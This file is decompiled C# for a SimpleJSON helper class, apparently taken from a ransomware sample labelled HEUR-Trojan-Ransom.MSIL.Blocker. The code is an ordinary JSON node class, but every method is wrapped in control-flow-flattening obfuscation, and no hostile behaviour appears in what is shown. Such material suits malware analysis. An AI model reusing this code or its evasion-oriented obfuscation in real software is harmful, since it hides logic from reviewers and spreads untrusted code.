// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: TypeLimitingDeserializationBind, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1D6D78DD-B812-498A-928B-6D9E4655E6A7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0f32fcee5fe0e98a2f219eac2c9b9c19cbb2f48660a676a0992bf38c59cdf153.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
      this.m_Node = aNode;
      this.m_Key = (string) null;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
      this.m_Node = aNode;
      this.m_Key = aKey;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = 697926669;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 656494728)) % 12U)
        {
          case 0:
            num1 = 678832374;
            continue;
          case 1:
            num1 = (int) num2 * -616114300 ^ 1235572863;
            continue;
          case 2:
            num1 = (int) num2 * -1492569254 ^ -614455829;
            continue;
          case 3:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -879436564 ^ 992388986;
            continue;
          case 4:
            num1 = (int) num2 * 1906988819 ^ 385797278;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * 1013019106 ^ 1274112296;
            continue;
          case 7:
            num1 = (int) num2 * 68182349 ^ -1209454776;
            continue;
          case 8:
            num1 = (int) num2 * -2143407489 ^ 1709349559;
            continue;
          case 9:
            int num3 = this.m_Key != null ? 871032364 : (num3 = 1094434965);
            num1 = num3 ^ (int) num2 * -1296537288;
            continue;
          case 10:
            num1 = (int) num2 * 952254320 ^ -1600762680;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      this.m_Node = (JSONNode) null;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 1431635581;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 894756172)) % 4U)
          {
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * 388111148 ^ 348266458;
              continue;
            case 2:
              num1 = (int) num2 * -1450583815 ^ -133952274;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONArray aVal = new JSONArray();
        aVal.Add(value);
label_1:
        int num1 = 664119527;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 112573469)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1472388806 ^ -965121751;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = -88330091;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1943414163)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * -218415787 ^ 1874183070;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 1436177689;
        JSONClass aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1455128946)) % 6U)
          {
            case 0:
              num1 = (int) num2 * -1621112929 ^ -1109948339;
              continue;
            case 1:
              aVal = new JSONClass();
              aVal.Add(aKey, value);
              num1 = (int) num2 * -128903351 ^ -872559589;
              continue;
            case 2:
              num1 = (int) num2 * -592898574 ^ -539260109;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 79813523 ^ 1342088985;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 151266707;
      JSONArray aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 62068112)) % 4U)
        {
          case 0:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -451634830 ^ -773747503;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            aVal = new JSONArray();
            aVal.Add(aItem);
            num1 = (int) num2 * -2135514065 ^ -1016837207;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
      JSONClass aVal = new JSONClass();
      aVal.Add(aKey, aItem);
label_1:
      int num1 = 782975209;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1571091696)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 1233654003 ^ 1525345162;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
      if (b != null)
        goto label_4;
label_1:
      int num1 = 1644951629;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1417430247)) % 5U)
        {
          case 0:
            num1 = (int) num2 * -1837776365 ^ 1425686329;
            continue;
          case 1:
            flag = true;
            num1 = (int) num2 * 906415949 ^ 644328324;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_4;
          default:
            goto label_6;
        }
      }
label_6:
      return flag;
label_4:
      flag = (object) a == b;
      num1 = 1062860578;
      goto label_2;
    }

    public static bool operator !=(JSONLazyCreator a, object b) => !(a == b);

    public override bool Equals(object obj)
    {
label_1:
      int num1 = -558171827;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1385972295)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = true;
            num1 = (int) num2 * -1919799568 ^ 1388200723;
            continue;
          case 2:
            int num3 = obj == null ? -315337336 : (num3 = -1975784644);
            num1 = num3 ^ (int) num2 * -888736472;
            continue;
          case 3:
            flag = (object) this == obj;
            num1 = -1861617268;
            continue;
          case 4:
            num1 = (int) num2 * -1030904286 ^ 1604400248;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
    }

    public override int GetHashCode()
    {
label_1:
      int num1 = -1429683622;
      int hashCode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -786572497)) % 3U)
        {
          case 1:
            hashCode = base.GetHashCode();
            num1 = (int) num2 * 585270224 ^ 709920431;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString() => "";

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 1626391235;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 8849866)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 549818795 ^ -347430755;
            continue;
          case 1:
            str = "";
            num1 = (int) num2 * 935628911 ^ -1188501471;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = -2116674413;
        JSONData aVal;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -608571370)) % 4U)
          {
            case 1:
              aVal = new JSONData(0);
              num1 = (int) num2 * 1237999204 ^ 131594937;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.Set((JSONNode) aVal);
              asInt = 0;
              num1 = (int) num2 * 1635051183 ^ -1793028065;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asInt;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = 254391132;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1124426622)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = (int) num2 * -1770104052 ^ -1091940074;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -384068624 ^ 1353821079;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override float AsFloat
    {
      get
      {
label_1:
        int num1 = 2092718394;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1027672375)) % 6U)
          {
            case 0:
              num1 = (int) num2 * 948435364 ^ 1611738974;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.Set((JSONNode) new JSONData(0.0f));
              num1 = (int) num2 * 2045862242 ^ -1737719235;
              continue;
            case 4:
              num1 = (int) num2 * -411508312 ^ 208032300;
              continue;
            case 5:
              asFloat = 0.0f;
              num1 = (int) num2 * 1945994958 ^ -938205615;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asFloat;
      }
      set
      {
        this.Set((JSONNode) new JSONData(value));
label_1:
        int num1 = 849809688;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 412073430)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = (int) num2 * 1839781941 ^ 208776443;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = -842045196;
        JSONData aVal;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -765362797)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1035525170 ^ 1030637506;
              continue;
            case 3:
              asDouble = 0.0;
              num1 = (int) num2 * -2059487180 ^ 992230133;
              continue;
            case 4:
              num1 = (int) num2 * 492268554 ^ 1578217109;
              continue;
            case 5:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * -1153540782 ^ 38858262;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asDouble;
      }
      set
      {
label_1:
        int num1 = -1737096197;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -719797899)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              aVal = new JSONData(value);
              num1 = (int) num2 * -962390708 ^ 1491226634;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1497158498 ^ -1364031722;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override bool AsBool
    {
      get
      {
        JSONData aVal = new JSONData(false);
label_1:
        int num1 = 746004816;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 254412515)) % 3U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              asBool = false;
              num1 = (int) num2 * 1161414721 ^ -904117783;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return asBool;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override JSONArray AsArray
    {
      get
      {
label_1:
        int num1 = -1117288633;
        JSONArray aVal;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2042122003)) % 5U)
          {
            case 0:
              asArray = aVal;
              num1 = (int) num2 * -636560540 ^ -290608046;
              continue;
            case 1:
              aVal = new JSONArray();
              num1 = (int) num2 * 584664802 ^ 1139180792;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -580497023 ^ 723370914;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
label_1:
        int num1 = 904630503;
        JSONClass aVal;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1364507925)) % 4U)
          {
            case 1:
              asObject = aVal;
              num1 = (int) num2 * 1936837859 ^ 374643638;
              continue;
            case 2:
              aVal = new JSONClass();
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 2144473686 ^ 773750448;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return asObject;
      }
    }
  }
}
